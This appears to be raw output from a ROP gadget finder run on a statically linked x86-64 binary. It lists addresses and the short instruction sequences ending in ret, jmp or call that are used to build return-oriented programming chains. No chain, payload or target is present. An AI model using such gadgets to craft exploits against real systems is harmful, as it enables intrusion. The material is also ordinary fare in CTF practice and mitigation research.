0x0000000000499267 : add byte ptr [rax], ch ; cli ; call qword ptr [rdx]
0x0000000000497763 : add byte ptr [rax], ch ; cmp byte ptr [rax], al ; add byte ptr [rax + 0x29], bh ; cli ; call qword ptr [rbx]
0x0000000000499e63 : add byte ptr [rax], ch ; pop rdi ; add byte ptr [rax], al ; pop rax ; ret 0xfffb
0x0000000000499263 : add byte ptr [rax], ch ; push rbx ; add byte ptr [rax], al ; sub dl, dh ; cli ; call qword ptr [rdx]
0x0000000000498167 : add byte ptr [rax], ch ; push rdi ; cli ; call qword ptr [rcx]
0x000000000049c743 : add byte ptr [rax], cl ; mov byte ptr [rax], al ; add byte ptr [rax + 0x2d], bh ; std ; jmp qword ptr [rdx]
0x0000000000475cae : add byte ptr [rax], cl ; mov byte ptr [rip + 0x22e4f9], 8 ; ret
0x0000000000494943 : add byte ptr [rax], cl ; or al, byte ptr [rax] ; add byte ptr [rax], bl ; sub edi, esi ; call qword ptr [rax]
0x0000000000475cb5 : add byte ptr [rax], cl ; ret
0x000000000047c66f : add byte ptr [rax], cl ; xchg eax, esp ; stc ; jmp qword ptr [rax]
0x000000000049c837 : add byte ptr [rax], cl ; xor ebp, edi ; jmp rdx
0x000000000049ac3f : add byte ptr [rax], dh ; cld ; jmp rdx
0x0000000000497b6b : add byte ptr [rax], dh ; cmp al, 0 ; add byte ptr [rax + 0x3b], dh ; cli ; jmp qword ptr [rcx]
0x000000000049736b : add byte ptr [rax], dh ; xor al, 0 ; add al, ah ; jle 0x497374 ; call qword ptr [rax]
0x0000000000497ebf : add byte ptr [rax], dl ; cli ; jmp qword ptr [rcx]
0x000000000047a5c5 : add byte ptr [rax], r8b ; add rsp, 8 ; ret
0x00000000004716e5 : add byte ptr [rax], r8b ; call qword ptr [rbx]
0x0000000000474ab5 : add byte ptr [rax], r8b ; call rax
0x000000000041477d : add byte ptr [rax], r8b ; jmp rax
0x0000000000415c0d : add byte ptr [rax], r8b ; mov eax, 0x16 ; ret
0x0000000000415bd5 : add byte ptr [rax], r8b ; mov eax, 0xc ; pop rbx ; ret
0x000000000040ee3d : add byte ptr [rax], r8b ; mov eax, 0xffffffff ; ret
0x000000000040e9ed : add byte ptr [rax], r8b ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x00000000004364fd : add byte ptr [rax], r8b ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000043653d : add byte ptr [rax], r8b ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000400a05 : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000004009cd : add byte ptr [rax], r8b ; ret
0x0000000000498e11 : add byte ptr [rax], r8b ; sub al, 0xbd ; cli ; jmp qword ptr [rdx]
0x00000000004388cd : add byte ptr [rax], r8b ; xor eax, eax ; ret
0x000000000043b746 : add byte ptr [rbp + 0x10], dh ; add rsp, 0x28 ; ret
0x000000000046d69f : add byte ptr [rbp + 0x12], dh ; add rsp, 0x38 ; ret
0x000000000046f44e : add byte ptr [rbp + 0x14], dh ; add rsp, 0x38 ; ret
0x00000000004783d3 : add byte ptr [rbp + 0x1a], dh ; ret
0x000000000046d435 : add byte ptr [rbp + 0x1c], dh ; add rsp, 0x48 ; ret
0x0000000000461f82 : add byte ptr [rbp + 0x1e], dh ; add rsp, 0x38 ; ret
0x000000000043aace : add byte ptr [rbp + 0x23], dh ; add rsp, 0x20 ; pop rbx ; ret
0x000000000045f3c9 : add byte ptr [rbp + 0x29], cl ; ret 0x8948
0x000000000044f901 : add byte ptr [rbp + 0x29], cl ; ret 0xf4c
0x000000000046d290 : add byte ptr [rbp + 0x30], dh ; add rsp, 0x38 ; ret
0x000000000040b08a : add byte ptr [rbp + 0x31], al ; dec dword ptr [rax + 0x39] ; ret 0x860f
0x0000000000447a37 : add byte ptr [rbp + 0x31], al ; leave ; call r15
0x000000000046eeb0 : add byte ptr [rbp + 0x3b], dh ; leave ; ret
0x000000000043c85f : add byte ptr [rbp + 0x41], bl ; pop rsp ; jmp rax
0x000000000043b976 : add byte ptr [rbp + 0x42], dh ; add rsp, 0x58 ; ret
0x000000000043bbc5 : add byte ptr [rbp + 0x43], dh ; add rsp, 0x18 ; ret
0x0000000000461e3b : add byte ptr [rbp + 0x45], dh ; add rsp, 0x58 ; ret
0x000000000040d267 : add byte ptr [rbp + 0x4a], dh ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000474c78 : add byte ptr [rbp + 0xb], dh ; add rsp, 0x28 ; ret
0x000000000046d325 : add byte ptr [rbp + 0xc], dh ; add rsp, 0x38 ; ret
0x0000000000472e7c : add byte ptr [rbp + 0xd], dh ; add rsp, 0x30 ; pop rbx ; ret
0x000000000046dfbf : add byte ptr [rbp + 0xf], cl ; lodsd eax, dword ptr [rsi] ; ret
0x000000000046deaf : add byte ptr [rbp + 0xf], cl ; movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x000000000043c675 : add byte ptr [rbp + 0xf], dh ; add rsp, 0x28 ; ret
0x0000000000472cca : add byte ptr [rbp + 0xf], dh ; add rsp, 0x38 ; ret
0x000000000044a44e : add byte ptr [rbp + 5], dh ; add rsp, 0x18 ; ret
0x000000000046fa7c : add byte ptr [rbp + 5], dh ; add rsp, 0x38 ; ret
0x000000000043bd46 : add byte ptr [rbp + 5], dh ; add rsp, 0x58 ; ret
0x000000000041044c : add byte ptr [rbp + 6], dh ; add rsp, 0x10 ; pop rbx ; ret
0x000000000046d4e9 : add byte ptr [rbp + 6], dh ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000477508 : add byte ptr [rbp + rax + 0x48], dh ; mov dword ptr [rdi + rsi*8], edx ; ret
0x000000000049849f : add byte ptr [rbp + rax*2], ah ; add byte ptr [rdx + rbp*2 - 6], cl ; jmp qword ptr [rdx]
0x0000000000477420 : add byte ptr [rbp + rbx + 0x48], dh ; add esp, 0x18 ; ret
0x0000000000487657 : add byte ptr [rbp + rcx + 0xdbf0000], bh ; add byte ptr [rax], al ; ret 0xd
0x000000000049962b : add byte ptr [rbp + rcx - 5], dl ; call qword ptr [rcx]
0x0000000000440c41 : add byte ptr [rbp + rcx*4 + 0x3c], cl ; ret
0x000000000043b2e4 : add byte ptr [rbp + rcx*4 + 0x3d], cl ; ret 0x42a
0x000000000045e97e : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x10 ; mov rdi, r12 ; call rbx
0x000000000045ea78 : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; mov rdi, r12 ; call rbx
0x000000000045eb72 : add byte ptr [rbp + rcx*4 + 0x4d], cl ; ror byte ptr [rcx + rcx*4 - 1], 0x41 ; call rsp
0x000000000049bcf7 : add byte ptr [rbp + rdi*2 - 0xd8c0000], bh ; cld ; call qword ptr [rcx]
0x0000000000496c57 : add byte ptr [rbp - 0x198c0000], bl ; idiv edi ; ret 2
0x000000000047a444 : add byte ptr [rbp - 0x1f], dh ; pop rbx ; ret
0x000000000043d89a : add byte ptr [rbp - 0x3dbbf040], al ; ret
0x0000000000487903 : add byte ptr [rbp - 0x3ffffff1], bh ; sldt word ptr [rax] ; ret
0x000000000043afef : add byte ptr [rbp - 0x57c03b0], cl ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x000000000047d834 : add byte ptr [rbp - 0x72ef0005], cl ; sti ; jmp qword ptr [rax]
0x0000000000464c80 : add byte ptr [rbp - 0x77], cl ; ret
0x00000000004543a1 : add byte ptr [rbp - 0x7b], cl ; rol byte ptr [rcx + 0xf], cl ; xchg eax, esp ; ret 0xf45
0x00000000004044a1 : add byte ptr [rbp - 0x7c], al ; ror byte ptr [rax + 0xf], 0x44 ; shr cl, 1 ; ret
0x000000000043ee95 : add byte ptr [rbp - 0xcf98b40], al ; ret
0x00000000004797f7 : add byte ptr [rbp - 0xcfb8b40], al ; ret
0x000000000049ac3c : add byte ptr [rbp], ch ; add byte ptr [rax], dh ; cld ; jmp rdx
0x000000000042f4c9 : add byte ptr [rbx + 0x148b8104], cl ; xchg eax, ecx ; sub eax, edx ; ret
0x000000000046fe5d : add byte ptr [rbx + 0x2342fc0d], cl ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000046b765 : add byte ptr [rbx + 0x236a7b0d], al ; add byte ptr [rcx], al ; pop rbx ; ret
0x0000000000415d8f : add byte ptr [rbx + 0x28e05a15], cl ; add bh, dh ; ret 0
0x000000000040ed77 : add byte ptr [rbx + 0x294f9505], al ; add byte ptr [rcx], al ; ret
0x0000000000411037 : add byte ptr [rbx + 0x31], bl ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00000000004490bf : add byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x0000000000447e5b : add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
0x000000000043650f : add byte ptr [rbx + 0x477880e], cl ; mov dword ptr [rdi], ecx ; ret
0x000000000043603f : add byte ptr [rbx + 0x48028901], cl ; lea eax, [rdx + 3] ; ret
0x000000000041474f : add byte ptr [rbx + 0x48], bl ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00000000004273af : add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x000000000040a0af : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000046ffdb : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000401486 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000407e5b : add byte ptr [rbx + 0x5d], bl ; ret
0x00000000004498af : add byte ptr [rbx + 0x63], cl ; xor al, 0x88 ; add rsi, r8 ; jmp rsi
0x000000000047984f : add byte ptr [rbx + 0x75c08507], cl ; or dh, bl ; ret
0x00000000004604da : add byte ptr [rbx + rax - 0xd], dh ; ret
0x00000000004774c7 : add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x000000000046f087 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x0000000000472bd7 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x00000000004992e7 : add byte ptr [rbx + rdx*2 - 0xdac0000], ch ; cli ; jmp rax
0x000000000045e38f : add byte ptr [rbx - 0x3b7cb7fe], cl ; or byte ptr [rbx + 0x5d], bl ; ret
0x000000000043a538 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x10 ; pop rbx ; ret
0x000000000043a546 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x20 ; pop rbx ; ret
0x000000000043a53f : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x30 ; pop rbx ; ret
0x000000000043a554 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x40 ; pop rbx ; ret
0x000000000043a54d : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x60 ; pop rbx ; ret
0x000000000043a531 : add byte ptr [rbx - 0x3d], bl ; mov eax, 8 ; pop rbx ; ret
0x000000000045a72f : add byte ptr [rbx - 0x4f743], al ; jmp qword ptr [rax]
0x000000000043a794 : add byte ptr [rbx - 0x50f0fe3e], al ; ror dword ptr [rdi], 0xaf ; ret 0xffe9
0x000000000045a324 : add byte ptr [rbx - 0x51f43], al ; call qword ptr [rax]
0x0000000000465e8c : add byte ptr [rbx - 0x76b7ffbb], cl ; ret 0x314c
0x000000000045403c : add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00000000004384f6 : add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x000000000047926f : add byte ptr [rbx - 0x7fbf8f19], al ; jmp qword ptr [rax]
0x000000000044c38d : add byte ptr [rbx - 0x8f743], al ; call qword ptr [rax]
0x0000000000467217 : add byte ptr [rbx], al ; add byte ptr [rax], al ; ret
0x0000000000455f74 : add byte ptr [rcx + 0x24cbb105], cl ; add byte ptr [rax + 0x63], cl ; ret 0x8948
0x00000000004093df : add byte ptr [rcx + 0x2b], cl ; adc byte ptr [r8 + 1], r9b ; ret
0x0000000000409346 : add byte ptr [rcx + 0x2b], cl ; and byte ptr [r8 + 1], r9b ; ret
0x000000000046009f : add byte ptr [rcx + 0x39], cl ; ret
0x000000000040f782 : add byte ptr [rcx + 0x39], cl ; ret 0x870f
0x0000000000474156 : add byte ptr [rcx + 0x3c8b48d8], cl ; ret 0x87f6
0x0000000000455d0a : add byte ptr [rcx + 0x415d5bd0], cl ; pop rsp ; ret
0x0000000000407f1d : add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; ret
0x000000000040fa30 : add byte ptr [rcx + 0x4789246f], cl ; adc byte ptr [rbx + 0x5d], bl ; ret
0x000000000040a900 : add byte ptr [rcx + 0x5c], al ; pop r13 ; pop r14 ; ret
0x000000000041fd4e : add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, [r11 + rdx] ; jmp rdx
0x0000000000475366 : add byte ptr [rcx + 0x63], cl ; add al, 0x87 ; add rax, r15 ; jmp rax
0x000000000041e5ac : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x0000000000436388 : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, [r11 + rcx] ; jmp rcx
0x000000000043d13f : add byte ptr [rcx + 0x63], cl ; ret 0x8b49
0x0000000000470516 : add byte ptr [rcx + 0xc8b48d8], cl ; ret 0xb60f
0x0000000000456e1a : add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0x83 ; ret
0x0000000000456da7 : add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x000000000045ae5b : add byte ptr [rcx + 0xf], al ; ret 0x3941
0x00000000004659ae : add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret 0x8545
0x0000000000454a9e : add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret 0xc931
0x0000000000438bff : add byte ptr [rcx + 1], cl ; ret
0x00000000004765b5 : add byte ptr [rcx + 1], cl ; ret 0xef89
0x000000000040fa0d : add byte ptr [rcx + rax + 0x57], al ; sbb byte ptr [rax + 0x39], cl ; ret
0x0000000000496847 : add byte ptr [rcx + rbp], cl ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; sal edi, 1 ; call qword ptr [rdx]
0x000000000049583f : add byte ptr [rcx + rbx], al ; add byte ptr [rax], al ; in al, dx ; ja 0x495846 ; call qword ptr [rdx]
0x000000000040d784 : add byte ptr [rcx + rcx - 0xd], dh ; ret
0x000000000047405f : add byte ptr [rcx + rcx*4 - 0x16], cl ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rbx]
0x0000000000413f3f : add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, r14 ; call 0x4101d9
0x000000000046b5d0 : add byte ptr [rcx + rcx*4 - 0x20], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004602ff : add byte ptr [rcx + rcx*4 - 0x40], cl ; vzeroupper ; ret
0x0000000000477f4f : add byte ptr [rcx + rcx*4 - 0xa], cl ; mov rdi, r12 ; call r15
0x00000000004162df : add byte ptr [rcx + rcx*8 - 0x7cb7de8c], al ; ret 0x4801
0x0000000000414148 : add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x414117 ; ret
0x000000000046aafb : add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0x840f
0x000000000046ab98 : add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0xc74
0x000000000043da07 : add byte ptr [rcx - 0x77], al ; ret
0x0000000000443933 : add byte ptr [rcx - 0x77], al ; ret 0x8949
0x000000000044cfcf : add byte ptr [rcx - 0x77], cl ; ret
0x000000000043a64f : add byte ptr [rcx - 0x77], cl ; ret 0x3949
0x0000000000474cea : add byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x0000000000474df9 : add byte ptr [rcx - 0x7b], cl ; ret 0x840f
0x0000000000413ee5 : add byte ptr [rcx - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000412793 : add byte ptr [rcx - 0x7d], cl ; ret
0x000000000040fe5f : add byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x000000000045bd87 : add byte ptr [rcx - 0x7d], cl ; ret 0x4c01
0x000000000041840f : add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x0000000000416d1f : add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x000000000040f75e : add byte ptr [rcx - 0x80], al ; clc ; add dword ptr [rdi + rcx + 0x44], eax ; ret 0xf641
0x000000000041ddd2 : add byte ptr [rcx - 9], cl ; ret 1
0x000000000041ddf8 : add byte ptr [rcx - 9], cl ; ret 2
0x000000000040f5a7 : add byte ptr [rcx], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004757ba : add byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucomip st(1) ; ret
0x0000000000438e0f : add byte ptr [rcx], al ; add byte ptr [rax], al ; sub rax, rdx ; ret
0x00000000004070ef : add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400a7b : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000046b76b : add byte ptr [rcx], al ; pop rbx ; ret
0x000000000040ed7d : add byte ptr [rcx], al ; ret
0x00000000004014ca : add byte ptr [rcx], bh ; ret
0x0000000000455b7a : add byte ptr [rcx], ch ; ret 0xd089
0x0000000000407204 : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000041d6dc : add byte ptr [rcx], dh ; rol bl, 0x83 ; ret 0x6620
0x0000000000461fca : add byte ptr [rcx], dh ; ror byte ptr [rax + 0x39], 0xd7 ; ja 0x462001 ; ret
0x000000000043eecb : add byte ptr [rcx], dh ; sar byte ptr [rcx], cl ; ret
0x00000000004617ff : add byte ptr [rcx], dh ; shr bl, 0xb9 ; call 0x43dad7
0x00000000004251fa : add byte ptr [rdi + 0x63], cl ; or al, 0x8b ; add r9, r11 ; jmp r9
0x0000000000477235 : add byte ptr [rdi + 1], bh ; call r14
0x000000000047725d : add byte ptr [rdi + 1], bh ; call rax
0x0000000000477fac : add byte ptr [rdi + 2], dh ; sbb eax, eax ; ret
0x0000000000497663 : add byte ptr [rdi + rbx - 6], bh ; call rsp
0x0000000000454bf6 : add byte ptr [rdi + rcx + 0x45], cl ; ret 0xf4c
0x000000000045a6d7 : add byte ptr [rdi + rcx + 0x48], cl ; fimul dword ptr [rbp + 0x63] ; ret
0x00000000004599e4 : add byte ptr [rdi + rcx + 0x48], cl ; fmul dword ptr [rbp + 0x63] ; ret
0x000000000040c39f : add byte ptr [rdi + rcx - 0x42], cl ; ret 0x4a8d
0x000000000049ce4f : add byte ptr [rdi + rcx*4], dl ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; pop rsi ; std ; jmp qword ptr [rdx]
0x00000000004976d7 : add byte ptr [rdi + rsi + 0x28540000], bl ; cli ; call qword ptr [rdx]
0x0000000000494440 : add byte ptr [rdi + rsi*8], al ; call qword ptr [rdx]
0x000000000049765f : add byte ptr [rdi + rsi], ah ; add byte ptr [rax], al ; jl 0x49768d ; cli ; call rsp
0x00000000004490bb : add byte ptr [rdi], ch ; mov byte ptr [rdi], 0 ; pop rbx ; pop r14 ; ret
0x00000000004490fe : add byte ptr [rdi], ch ; mov byte ptr [rdi], 0 ; ret
0x0000000000426b76 : add byte ptr [rdi], cl ; cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x000000000043a407 : add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x0000000000427baf : add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x0000000000427c1f : add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x000000000043a4bf : add byte ptr [rdi], cl ; mov dh, 0xc1 ; pop rbx ; ret
0x0000000000417fbf : add byte ptr [rdi], cl ; mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000040a90f : add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000041e33f : add byte ptr [rdi], cl ; mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000041de7f : add byte ptr [rdi], cl ; mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x000000000041d70f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x000000000041d73f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x000000000041d72f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x000000000041d71f : add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x0000000000467573 : add byte ptr [rdi], cl ; ret 0x8d48
0x000000000044864b : add byte ptr [rdi], cl ; ret 0xc083
0x0000000000406b01 : add byte ptr [rdi], cl ; xchg byte ptr [rsi + rdi*8 + 0x158bffff], dl ; ret 0x29cd
0x0000000000441304 : add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x0000000000457285 : add byte ptr [rdi], cl ; xchg esi, esp ; sbb byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000049963c : add byte ptr [rdi], dl ; add byte ptr [rax + 0xd], ah ; sti ; call qword ptr [rcx]
0x000000000044571d : add byte ptr [rdx + 0x1d0], bh ; call 0x4019f8
0x00000000004456fe : add byte ptr [rdx + 0x1d6], bh ; call 0x4019f8
0x0000000000435fff : add byte ptr [rdx + 0x48028801], cl ; lea eax, [rdx] ; ret
0x000000000043484f : add byte ptr [rdx + 0x48028801], cl ; mov eax, edi ; ret
0x0000000000477437 : add byte ptr [rdx + 0x48], dh ; add esp, 0x18 ; ret
0x0000000000467bdc : add byte ptr [rdx + 0x63], cl ; add al, 0xa6 ; add rax, rsi ; jmp rax
0x0000000000465722 : add byte ptr [rdx + 0x828], bh ; call 0x4019f8
0x000000000046575f : add byte ptr [rdx + 0x829], bh ; call 0x4019f8
0x000000000040a447 : add byte ptr [rdx + rax - 0xd], dh ; ret
0x00000000004984a3 : add byte ptr [rdx + rbp*2 - 6], cl ; jmp qword ptr [rdx]
0x0000000000487257 : add byte ptr [rdx + rcx + 0xabf0000], bh ; add byte ptr [rax], al ; ret 0xa
0x000000000047cdf8 : add byte ptr [rdx + rdi*8 - 0x5546f01], ch ; jmp qword ptr [rax]
0x000000000049bcfb : add byte ptr [rdx + rsi*8 - 4], dh ; call qword ptr [rcx]
0x00000000004992eb : add byte ptr [rdx + rsi*8 - 6], dl ; jmp rax
0x0000000000466b21 : add byte ptr [rdx], 0 ; add byte ptr [rax + 0x39], cl ; ret 0xed75
0x0000000000446ba1 : add byte ptr [rsi + 0x41], ah ; cmp ecx, 0x860f07ff ; ret
0x000000000041e8b4 : add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000451786 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x00000000004517af : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xb7e8
0x00000000004541ad : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xb9e8
0x000000000045174d : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x000000000041d644 : add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x000000000049c577 : add byte ptr [rsi + rax*4], bh ; add byte ptr [rax], al ; je 0x49c5a6 ; std ; call rdi
0x00000000004167c1 : add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x00000000004004cd : add byte ptr [rsi - 0x70], ah ; ret
0x0000000000416787 : add byte ptr [rsi - 9], dh ; ret 0
0x0000000000497d5d : add byte ptr ds:[rax], al ; mov al, 0x40 ; cli ; call qword ptr [rbx]
0x000000000043b115 : add byte ptr es:[rax + 0x39], cl ; ret
0x000000000043ee94 : add byte ptr es:[rbp - 0xcf98b40], al ; ret
0x00000000004984a0 : add byte ptr fs:[r8], r8b ; push -6 ; jmp qword ptr [rdx]
0x000000000049dc38 : add byte ptr fs:[rax], al ; add byte ptr [rax], al ; popfq ; add byte ptr [rax], al ; ret 0xfffd
0x000000000043d897 : add byte ptr fs:[rax], al ; add byte ptr [rbp - 0x3dbbf040], al ; ret
0x000000000048c4e5 : add ch, bh ; jmp rsp
0x000000000048c4e1 : add ch, bh ; ljmp [rax + rax - 3] ; jmp rsp
0x000000000049211c : add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x000000000049211d : add ch, byte ptr [rbp + rbp*2 + 0x5b] ; ret 0x6f9
0x000000000049bf6d : add ch, byte ptr [rbp + rcx + 7] ; ret
0x000000000047cec0 : add ch, byte ptr [rbx - 0x556d0006] ; cli ; jmp qword ptr [rdx]
0x0000000000455155 : add ch, byte ptr [rbx] ; add byte ptr [rax], al ; add cl, ch ; ret
0x000000000041158f : add ch, byte ptr [rcx] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000045e6ea : add ch, byte ptr [rcx] ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x0000000000456e56 : add ch, byte ptr [rip - 0x7d000000] ; ret
0x00000000004951d3 : add ch, byte ptr [rsi + rcx + 8] ; ret
0x000000000043a4e8 : add cl, al ; call 0xffffffff84062e00
0x0000000000434877 : add cl, byte ptr [r8 - 0x76b7fdbe] ; clc ; ret
0x0000000000457621 : add cl, byte ptr [rax + 0x29] ; ret
0x0000000000456b86 : add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x000000000043a1d4 : add cl, byte ptr [rax + 0x77f8c50f] ; ret
0x0000000000412b1b : add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x0000000000412630 : add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x0000000000416a5c : add cl, byte ptr [rax + 0xf] ; ret 0xc3f3
0x00000000004094e4 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000409403 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x0000000000434878 : add cl, byte ptr [rax - 0x76b7fdbe] ; clc ; ret
0x00000000004347e5 : add cl, byte ptr [rax - 0x77] ; clc ; ret
0x0000000000470085 : add cl, byte ptr [rax - 0x77] ; je 0x4700b6 ; or byte ptr [rax + 1], cl ; ret
0x000000000046a134 : add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x000000000040e9d2 : add cl, byte ptr [rax - 0x7b] ; sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x0000000000433040 : add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x00000000004330a3 : add cl, byte ptr [rax - 0x7d] ; ret 0xe908
0x00000000004279f2 : add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x00000000004599dc : add cl, byte ptr [rcx + 0x29] ; ret
0x0000000000438efb : add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x000000000045f12a : add cl, byte ptr [rsi] ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000044490f : add cl, ch ; ret
0x0000000000444559 : add cl, ch ; ret 0xfffc
0x000000000047d73c : add cl, dh ; cli ; call qword ptr [rax]
0x000000000045752f : add dh, al ; test eax, esi ; idiv bh ; jmp qword ptr [rax]
0x000000000044ce01 : add dh, al ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x000000000048a757 : add dh, bh ; xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x0000000000427ba3 : add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000040a449 : add dh, bl ; ret
0x00000000004167fe : add dh, byte ptr [rax + rcx - 9] ; ret 0
0x000000000049571d : add dh, byte ptr [rcx + 0xa] ; ret
0x000000000044279f : add dh, dh ; ret 0x4801
0x0000000000414fb7 : add dh, dh ; ret 0x4804
0x0000000000468058 : add dh, dh ; ret 0x7403
0x000000000043c70f : add dh, dh ; ret 0x7404
0x0000000000436f27 : add dh, dh ; ret 0x7501
0x0000000000436f34 : add dh, dh ; ret 0x7502
0x0000000000436f41 : add dh, dh ; ret 0x7504
0x0000000000436ef9 : add dh, dh ; ret 0x7510
0x0000000000436f06 : add dh, dh ; ret 0x7520
0x0000000000416a2c : add dh, dh ; ret 0x7540
0x000000000041526a : add dh, dh ; ret 0xf02
0x00000000004553cf : add dh, dh ; ret 0xf08
0x00000000004582ef : add dh, dh ; ret 0xf10
0x0000000000454917 : add dh, dh ; ret 0xf40
0x00000000004548ff : add dh, dh ; ret 0xf50
0x000000000040753e : add dil, sil ; ret 0xffef
0x0000000000465ebb : add dl, byte ptr [rax - 0x77] ; ret 0xc389
0x000000000047d3b8 : add dl, dl ; cli ; call qword ptr [rdx + 0x22fffad1]
0x000000000045d057 : add dword ptr [r8 - 0x75], r9d ; adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x00000000004416f3 : add dword ptr [r8 - 0x7d], r9d ; ret
0x0000000000436001 : add dword ptr [rax + 0x28d4802], ecx ; ret
0x000000000040d983 : add dword ptr [rax + 0x39], ecx ; ret
0x000000000046b5aa : add dword ptr [rax + 0x39], ecx ; ret 0x1172
